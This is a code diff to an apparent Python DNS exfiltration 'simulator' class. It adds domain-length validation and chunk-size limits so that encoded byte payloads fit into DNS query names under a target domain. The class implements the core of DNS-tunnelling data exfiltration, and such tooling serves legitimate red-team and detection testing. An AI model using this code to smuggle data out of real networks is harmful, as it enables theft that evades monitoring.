@@ -42,6 +42,14 @@ class DNSExfiltrationSimulator:
         self.delay = delay
         self.jitter = jitter
 
+        domain_labels = self.target_domain.split(".")
+        if (
+            not self.target_domain
+            or len(self.target_domain) > 253
+            or any(not label or len(label) > 63 for label in domain_labels)
+        ):
+            raise ValueError("target_domain must use labels of 1-63 characters and be at most 253 characters")
+
     def encode_payload(self, data: bytes) -> str:
         """Encode raw bytes according to selected encoding scheme."""
         if self.encoding == "base32":
@@ -58,10 +66,19 @@ class DNSExfiltrationSimulator:
 
     def chunk_payload(self, encoded_data: str) -> List[str]:
         """Split encoded data into DNS label chunks with sequence numbers."""
-        # Reserve space for sequence numbering: e.g. "001." (4 chars)
-        usable_len = self.max_label_length - 6
+        # Each query has a sequence label, a payload label, and the target domain.
+        # Keep the payload label at or below 50 characters where possible, while
+        # reducing it when a long target domain would exceed the 253-char FQDN limit.
+        sequence_label_length = 7  # "001-001"
+        fqdn_payload_limit = 253 - len(self.target_domain) - sequence_label_length - 2
+        usable_len = min(50, self.max_label_length, fqdn_payload_limit)
+        if usable_len < 1:
+            raise ValueError("target_domain leaves no room for a DNS payload label")
+
         chunks = [encoded_data[i:i + usable_len] for i in range(0, len(encoded_data), usable_len)]
         total_chunks = len(chunks)
+        if total_chunks > 999:
+            raise ValueError("Payload is too large for the three-digit query sequence")
 
         labeled_chunks = []
         for idx, chunk in enumerate(chunks, start=1):
@@ -74,6 +91,8 @@ class DNSExfiltrationSimulator:
         encoded = self.encode_payload(payload)
         chunks = self.chunk_payload(encoded)
         fqdns = [f"{chunk}.{self.target_domain}" for chunk in chunks]
+        if any(len(fqdn.rstrip(".")) > 253 for fqdn in fqdns):
+            raise ValueError("Generated DNS query exceeds the 253-character FQDN limit")
         return fqdns
 
     def craft_packet(self, fqdn: str, qtype: str = "A"):
